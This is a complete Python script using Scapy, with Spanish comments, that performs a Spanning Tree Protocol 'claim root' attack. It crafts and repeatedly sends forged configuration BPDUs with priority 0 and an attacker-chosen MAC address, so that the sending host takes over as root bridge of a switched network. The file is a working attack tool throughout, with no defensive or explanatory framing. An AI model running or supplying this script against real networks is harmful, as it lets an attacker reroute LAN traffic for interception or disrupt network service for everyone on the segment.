#!/usr/bin/env python3
"""
STP Claim Root Attack Script - Scapy 2.5.0
Usa sendp() y permite MAC personalizada
"""

from scapy.all import *
import sys
import argparse
import time
import struct

# Configuración
CONFIG = {
    'interface': None,
    'bridge_priority': 0,
    'forward_delay': 15,
    'hello_time': 2,
    'max_age': 20,
    'interval': 2,
    'count': 0,
    'custom_mac': None  # MAC personalizada para el ataque
}

def mac_to_bytes(mac_str):
    """Convierte MAC string a bytes"""
    return bytes.fromhex(mac_str.replace(':', '').replace('-', ''))

def bytes_to_mac(mac_bytes):
    """Convierte bytes a MAC string"""
    return ':'.join(f'{b:02x}' for b in mac_bytes)

def create_stp_packet(config):
    """
    Crea paquete STP usando sendp() con MAC personalizada
    """
    # Usar MAC personalizada o la de la interfaz
    if config['custom_mac']:
        attacker_mac = config['custom_mac']
        attacker_mac_bytes = mac_to_bytes(attacker_mac)
    else:
        attacker_mac = get_if_hwaddr(config['interface'])
        attacker_mac_bytes = mac_to_bytes(attacker_mac)
    
    # Bridge ID = Prioridad (2 bytes) + MAC (6 bytes)
    priority_bytes = struct.pack('!H', config['bridge_priority'])
    root_id_bytes = priority_bytes + attacker_mac_bytes
    bridge_id_bytes = priority_bytes + attacker_mac_bytes
    
    # Convertir a enteros para campos de 8 bytes
    root_id_int = int.from_bytes(root_id_bytes, byteorder='big')
    bridge_id_int = int.from_bytes(bridge_id_bytes, byteorder='big')
    
    # Construir payload STP manualmente
    # Estructura: [Proto:2][Ver:1][Type:1][Flags:1][RootID:8][PathCost:4][BridgeID:8][PortID:2][Age:2][MaxAge:2][Hello:2][FwdDelay:2]
    stp_payload = b''
    stp_payload += struct.pack('!H', 0)                      # Protocol ID
    stp_payload += struct.pack('!B', 0)                      # Version
    stp_payload += struct.pack('!B', 0)                      # BPDU Type (Config)
    stp_payload += struct.pack('!B', 0)                      # Flags
    stp_payload += root_id_bytes                              # Root ID (8 bytes)
    stp_payload += struct.pack('!I', 0)                      # Root Path Cost
    stp_payload += bridge_id_bytes                            # Bridge ID (8 bytes)
    stp_payload += struct.pack('!H', 0x8001)                 # Port ID
    stp_payload += struct.pack('!H', 0)                      # Message Age
    stp_payload += struct.pack('!H', config['max_age'])     # Max Age
    stp_payload += struct.pack('!H', config['hello_time'])  # Hello Time
    stp_payload += struct.pack('!H', config['forward_delay'])# Forward Delay
    
    # LLC Header
    llc_header = bytes([0x42, 0x42, 0x03])  # DSAP=SSAP=0x42, Control=0x03
    
    # Ethernet + LLC + STP
    # Usar MAC destino multicast 01:80:C2:00:00:00
    packet = (
        mac_to_bytes('01:80:C2:00:00:00') +  # DST
        attacker_mac_bytes +                  # SRC (personalizada)
        struct.pack('!H', len(llc_header) + len(stp_payload)) +  # Length
        llc_header +
        stp_payload
    )
    
    return packet, attacker_mac

def send_stp_packet(packet_bytes, interface):
    """
    Envia usando sendp() de Scapy - necesario para STP
    """
    try:
        # Convertir bytes a Ether para usar sendp()
        # Creamos un paquete Ether manual
        pkt = Ether(packet_bytes)
        sendp(pkt, iface=interface, verbose=0)
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def start_attack(interface, config):
    """
    Inicia el ataque
    """
    config['interface'] = interface
    
    mac_display = config['custom_mac'] if config['custom_mac'] else get_if_hwaddr(interface)
    
    print("=" * 70)
    print("STP Claim Root Attack - Scapy 2.5.0")
    print("=" * 70)
    print(f"Interfaz: {interface}")
    print(f"MAC usada en BPDUs: {mac_display}")
    print(f"Prioridad: {config['bridge_priority']}")
    print(f"Intervalo: {config['interval']}s")
    print("=" * 70)
    print("\n[*] Enviando BPDUs... Presiona Ctrl+C para detener\n")
    
    packet_count = 0
    
    try:
        while True:
            packet_bytes, used_mac = create_stp_packet(config)
            
            if send_stp_packet(packet_bytes, interface):
                packet_count += 1
                print(f"[+] BPDU #{packet_count} | MAC: {used_mac} | Prioridad: {config['bridge_priority']}", end='\r')
                
                if packet_count % 10 == 0:
                    print(f"\n    [INFO] Total enviados: {packet_count}")
            
            if config['count'] > 0 and packet_count >= config['count']:
                break
            
            time.sleep(config['interval'])
            
    except KeyboardInterrupt:
        print(f"\n\n[*] Ataque detenido. Total: {packet_count} BPDUs")
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='STP Root Attack - Scapy 2.5.0')
    
    parser.add_argument('-i', '--interface', required=True, help='Interfaz')
    parser.add_argument('-p', '--priority', type=int, default=0, help='Prioridad (mult 4096)')
    parser.add_argument('--mac', help='MAC personalizada (ej: 00:11:22:33:44:55)')
    parser.add_argument('--interval', type=float, default=2, help='Intervalo segundos')
    parser.add_argument('-c', '--count', type=int, default=0, help='Cantidad (0=infinito)')
    
    args = parser.parse_args()
    
    if args.priority % 4096 != 0:
        print("[-] Prioridad debe ser multiplo de 4096")
        sys.exit(1)
    
    if args.mac:
        # Validar formato MAC
        if len(args.mac.replace(':', '').replace('-', '')) != 12:
            print("[-] MAC invalida")
            sys.exit(1)
        CONFIG['custom_mac'] = args.mac.lower()
    
    CONFIG['bridge_priority'] = args.priority
    CONFIG['interval'] = args.interval
    CONFIG['count'] = args.count
    
    if os.geteuid() != 0:
        print("[-] Requiere root")
        sys.exit(1)
    
    start_attack(args.interface, CONFIG)

if __name__ == '__main__':
    main()
